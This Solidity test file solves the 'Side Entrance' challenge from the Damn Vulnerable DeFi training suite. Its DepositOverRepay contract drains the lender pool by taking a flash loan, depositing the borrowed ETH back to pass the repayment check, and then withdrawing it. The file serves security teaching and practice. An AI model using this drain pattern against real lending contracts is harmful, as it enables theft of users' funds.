// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import { SideEntranceLenderPool, IFlashLoanEtherReceiver } from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // Deploy exploit contract
        DepositOverRepay exploit = new DepositOverRepay(address(pool), recovery);

        // Start attack
        exploit.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}


contract DepositOverRepay is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    // Step 1: pool calls this during the flash loan
    function execute() external payable override {
        // Deposit the flash loaned ETH back into the pool
        pool.deposit{value: msg.value}();
    }

    // Step 2: start the attack from here
    function attack() external {
        // Take all the ETH in the pool as a flashloan
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);

        // Now we have a balance inside the pool contract
        pool.withdraw();

        // Send it all to the recovery address
        payable(recovery).transfer(address(this).balance);
    }

    // Needed to receive ETH
    receive() external payable {}
}

